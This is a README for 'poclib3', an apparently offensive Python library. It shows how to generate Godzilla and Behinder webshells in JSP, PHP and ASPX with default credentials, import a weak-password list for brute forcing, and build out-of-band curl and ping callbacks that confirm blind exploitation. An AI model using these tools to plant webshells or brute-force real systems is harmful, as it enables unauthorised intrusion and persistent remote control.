# poclib3

## Installation

```bash
pip3 install poclib3
```

## Usage

### Webshell

```python
from poclib3.webshell import get_godzilla_jsp_shell, get_shell_result
# from poclib3.webshell import get_behinder4_jsp_shell
# from poclib3.webshell import get_behinder4_php_shell
# from poclib3.webshell import get_behinder4_aspx_shell
# from poclib3.webshell import get_behinder3_aspx_shell
# from poclib3.webshell import get_godzilla_jspx_shell
# from poclib3.webshell import get_godzilla_php_shell
# from poclib3.webshell import get_godzilla_aspx_shell
# from poclib3.webshell import get_godzilla_ashx_shell
# from poclib3.webshell import get_define_class_shell

webshell = get_godzilla_jsp_shell()
print(webshell.tool)
# godzilla
print(webshell.type)
# jsp
print(webshell.mode)
# java_aes_base64
print(webshell.pas)
# pass
print(webshell.key)
# key
print(webshell.raw_content)
# [raw webshell]
print(webshell.content)
# [unicode-encoding one-line webshell]

result = get_shell_result(webshell)
print(result)
# {'pas': 'pass', 'key': 'key', 'tool': 'godzilla', 'mode': 'java_aes_base64', 'type': 'jsp'}
```

### Brute

```python
from poclib3.brute import WEAK_PASSWORD
```

### Atlas
```bash
export ATLAS_DOMAIN=...
export ATLAS_IDENTIFY=...
export ATLAS_TOKEN=...
```
```python
import os
from poclib3.atlas import Atlas

atlas = Atlas()

flag = atlas.build_request(type="web")
os.system("curl " + flag["url"])
print(atlas.verify_request(flag["flag"], type="web"))

flag = atlas.build_request(type="dns")
os.system("ping -nc 2 " + flag["url"])
print(atlas.verify_request(flag["flag"], type="dns"))
```
